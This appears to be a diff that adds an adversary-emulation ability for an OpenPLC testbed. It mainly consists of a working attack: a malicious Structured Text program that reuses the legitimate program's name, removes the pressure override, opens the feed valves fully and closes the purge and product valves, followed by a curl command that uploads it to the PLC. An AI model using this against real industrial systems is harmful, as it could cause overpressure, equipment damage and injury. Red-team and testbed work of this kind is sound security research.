@@ -1,0 +1,63 @@
+---
+
+- id: c9d0e1f2-9999-9999-9999-000000000005
+  name: OpenPLC - Upload Masqueraded Malicious Logic
+  description: |
+    Upload a malicious ST program named identically to the legitimate
+    program (326339.st). The malicious logic removes pressure_override,
+    sets dangerous valve positions, but looks identical at first glance.
+  tactic: evasion
+  technique_id: T0849
+  technique_name: Masquerading
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      cat > /tmp/326339.st << 'STEOF'
+      FUNCTION scale_to_real : REAL
+        VAR_INPUT raw_input_value : UINT := 0; END_VAR
+        VAR_OUTPUT scaled_real : REAL := 0.0; END_VAR
+        VAR_INPUT real_max : REAL := 0.0; real_min : REAL := 0.0; END_VAR
+        VAR raw_max : UINT := 65535; raw_min : UINT := 0; END_VAR
+        VAR rate : REAL := 1.0; offset : REAL := 1.0; END_VAR
+        rate := (real_max - real_min) / UINT_TO_REAL(raw_max - raw_min);
+        offset := real_min - UINT_TO_REAL(raw_min)*rate;
+        scaled_real := UINT_TO_REAL(raw_input_value)*rate + offset;
+        scale_to_real := scaled_real;
+      END_FUNCTION
+
+      FUNCTION scale_to_uint : UINT
+        VAR_INPUT real_in : REAL := 0.0; END_VAR
+        VAR_OUTPUT uint_out : UINT := 0; END_VAR
+        uint_out := REAL_TO_UINT((real_in / 100.0) * 65535.0);
+        scale_to_uint := uint_out;
+      END_FUNCTION
+
+      PROGRAM main1
+        VAR
+          f1_valve_sp AT %QW100 : UINT;
+          f2_valve_sp AT %QW101 : UINT;
+          purge_valve_sp AT %QW102 : UINT;
+          product_valve_sp AT %QW103 : UINT;
+          run_bit AT %QX5.0 : BOOL := TRUE;
+        END_VAR
+        f1_valve_sp := 65535;
+        f2_valve_sp := 65535;
+        purge_valve_sp := 0;
+        product_valve_sp := 0;
+        run_bit := TRUE;
+      END_PROGRAM
+
+      CONFIGURATION Config0
+        RESOURCE Res0 ON PLC
+          TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
+          PROGRAM instance0 WITH task0 : main1;
+        END_RESOURCE
+      END_CONFIGURATION
+      STEOF
+
+      curl -s -b /tmp/plc.jar
+      -X POST "http://192.168.95.2:8080/upload-program"
+      -F "file=@/tmp/326339.st"
+      -L -o /tmp/upload.html -w "%{http_code}" &&
+      echo "MASQUERADED_PROGRAM_UPLOADED: 326339.st"
